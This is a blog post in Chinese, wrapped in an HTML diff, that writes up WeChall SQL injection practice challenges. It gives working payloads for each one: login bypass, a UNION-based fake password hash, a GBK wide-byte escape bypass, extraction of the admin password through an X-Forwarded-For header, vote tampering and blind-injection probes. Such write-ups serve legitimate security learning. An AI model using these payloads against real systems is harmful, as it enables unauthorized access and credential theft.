@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<title>Wechall SQLI
+</title>
+		<link rel="stylesheet" href="/static/init.css" type="text/css">
+		<link rel="stylesheet" href="/static/yue.css" type="text/css">
+		<link rel="stylesheet" href="/static/blog.css" type="text/css">
+	</head>
+	<body>
+		<div id="page">
+			<main class="yue">
+			<article>
+				<h1 class="title"><a href="/articles/wechall_sql.html">Wechall SQLI
+</a></h1>
+				<aside class="time">
+					Posted at
+					<time>2015-11-09 12:00:00 &#43;0000 UTC</time>
+				</aside>
+				<section class="post-content">
+					<p>这些题是为了准备安恒杯校内个人赛做的，<del>虽然后来还是没做出安恒杯的sql注入（据说只要用sqlmap扫就行？）</del></p>
+
+<h2>MySQL1</h2>
+
+<p>基础入门题<br />
+username完全无过滤，可以直接去掉密码验证<br />
+查询语句</p>
+
+<pre><code class="language-sql">SELECT * FROM users WHERE username='$username' AND password='$password'
+</code></pre>
+
+<p>构造：</p>
+
+<pre><code class="language-sql">SELECT * FROM users WHERE username='admin' or ''='' AND password='$password'
+</code></pre>
+
+<p>传说中的万能密码的原理  admin&rsquo; or &ldquo;=&rsquo;</p>
+
+<h2>MySQL2</h2>
+
+<p>依然基础题，南邮的平台上遇到过类似的。<br />
+先用用户名取出密码，然后比对密码。只要让sql语句返回一个假的密码就OK了。<br />
+查询语句：</p>
+
+<pre><code class="language-sql">SELECT * FROM users WHERE username='$username'
+</code></pre>
+
+<p>构造：</p>
+
+<pre><code class="language-sql">SELECT * FROM users WHERE username='admin' and 1=2 union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'
+</code></pre>
+
+<p>注意PHP的md5函数得到的是32位小写的md5</p>
+
+<h2>The Guestbook</h2>
+
+<pre><code class="language-sql">INSERT INTO gbook_book VALUES('$playerid', $userid, $time, '$ip', '$message')
+</code></pre>
+
+<p>ip message都是注入点。<br />
+ip好像不太好注入。<br />
+message可以注。<br />
+构造：</p>
+
+<pre><code class="language-sql">INSERT INTO gbook_book VALUES('$playerid', $userid, $time, '$ip', 'aaa') #')
+</code></pre>
+
+<p>然而有一个<code>mysql_real_escape_string</code>，会自动转译。搜了一下可以通过宽字符绕过。</p>
+
+<p>例子：</p>
+
+<pre><code class="language-php">&lt;?php  
+    header('Content-Type: text/html; charset=GBK');  
+    $input = chr(0xbf) . chr(0x27) . ' OR username = username; /*';  
+    $value = addslashes($input);  
+    $sql = &quot;SELECT * FROM users WHERE username='{$value}' AND password='123123';&quot;;  
+  
+    echo $value;  
+    echo '&lt;br&gt;';  
+    echo $sql;  
+    echo '&lt;br&gt;';  
+</code></pre>
+
+<p>chr(0xbf) 和 chr(0x27)相连接, 构成一个双字节字符(0xbf27)… 而0xbf27只是一个人为合成的双字节, 不在GBK编码表里, 也就是说不是一个合法的GBK双字节字符… 系统（mysql）会把这个双字节拆分为2个单字节解析(也就是0xbf和0x27), 而<code>addslashes</code>并不知道它是非法的双字节字符, 单引号的GBK编码就是chr(0x27), 单独使用使<code>addslashes</code>是可以识别的&hellip;</p>
+
+<p>然而这个洞已经在mysql5.0.x修复了。。作罢</p>
+
+<p>只能从IP注入了。。上burpsuite，加一个X-Forwarded-For</p>
+
+<p>构造：</p>
+
+<pre><code class="language-sql">INSERT INTO gbook_book VALUES('$playerid', $userid, $time, '127.0.0.1',(select gbu_password from gbook_user where  gbu_name='admin'))#‘, '$message')
+</code></pre>
+
+<p>其实中间复习了一波sql语句。。但是没搞懂怎么在insert语句里用select的结果。。后来发现加一对括号足以。。。</p>
+
+<h2>No Escape</h2>
+
+<p>要刷票233333<br />
+关键语句：</p>
+
+<pre><code class="language-sql">UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1
+</code></pre>
+
+<p>构造：</p>
+
+<pre><code class="language-sql">UPDATE noescvotes SET `george`=`george`+100 #`=`george`+1 WHERE id=1
+</code></pre>
+
+<p>实际的url参数：</p>
+
+<pre><code class="language-url">?vote_for=george`=`george`%2b111%23
+</code></pre>
+
+<p>注意url转义</p>
+
+<h2>Blinded by the light</h2>
+
+<p>目标是获取  an md5 password hash<br />
+盲注<br />
+关键语句</p>
+
+<pre><code class="language-sql">SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'
+</code></pre>
+
+<p><code>'union select '1'#</code>直接可以登陆，然而它要密码。。<br />
+<code>'or'1'='1'#</code>正确的情况<br />
+<code>'or'1'='2'#</code>错误的情况<br />
+<code>'or password=password#</code><br />
+发现生成的hash只有ABCDEF0123456789这些字符，就是一个32位的16进制的数<br />
+<code>'or password=0#</code>正确。。<br />
+弃治看题解。。<br />
+题解提到了一个sql函数substring。。<br />
+于是去补了一通sql函数</p>
+
+<pre><code class="language-sql">CONCAT( 字串1, 字串2, 字串3, ...)  
+SUBSTR (str, pos, len) 
+SUBSTR (str, pos)
+TRIM（）
+Length (str)
+REPLACE (Region_Name, 'ast', 'astern')
+</code></pre>
+
+<p><code>#</code>是个很不靠谱的注释符号<br />
+还是用<code>--</code>比较好</p>
+
+<p>最后的解法是二分猜解<br />
+解题代码直接看乌云的题解吧。。。</p>
+
+<h2>参考资料</h2>
+
+<p><a href="http://drops.wooyun.org/tips/7299">MySQL注入技巧_乌云</a><br />
+<a href="http://drops.wooyun.org/papers/1321">wechall mysql关卡题解_乌云</a></p>
+
+				</section>
+			</article>
+			<div id="disqus_thread"></div>
+			
+			<div class="ds-thread" data-thread-key="wechall_sql" data-title="Wechall SQLI
+" data-url="/articles/wechall_sql.html"></div>
+			
+			
+			<script type="text/javascript">
+			var duoshuoQuery = {short_name:"wxyblog"};
+				(function() {
+					var ds = document.createElement('script');
+					ds.type = 'text/javascript';ds.async = true;
+					ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+					ds.charset = 'UTF-8';
+					(document.getElementsByTagName('head')[0]
+					|| document.getElementsByTagName('body')[0]).appendChild(ds);
+				})();
+			</script>
+			
+			</main>
+			<div id="right">
+				<div id="float">
+					<img id="logo" src="/static/logo.jpg">
+					<p class="name">Wxy's</p>
+					</img>
+					
+					<nav>
+						<ul>
+							<li><a href="/">Home</a></li>
+							<li><a href="/archive.html">Archives</a></li>
+							<li><a href="/links.html">Links</a></li>
+							<li><a href="/about.html">About</a></li>
+						</ul>
+					</nav>
+				</div>
+			</div>
+		</div>
+		<footer id="footer">
+			Powered by Blogo
+		</footer>
+		<link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.2.0/styles/default.min.css">
+		<script src="//cdn.jsdelivr.net/highlight.js/9.2.0/highlight.min.js"></script>
+		<script>hljs.initHighlightingOnLoad();</script>
+	</body>
+</html>
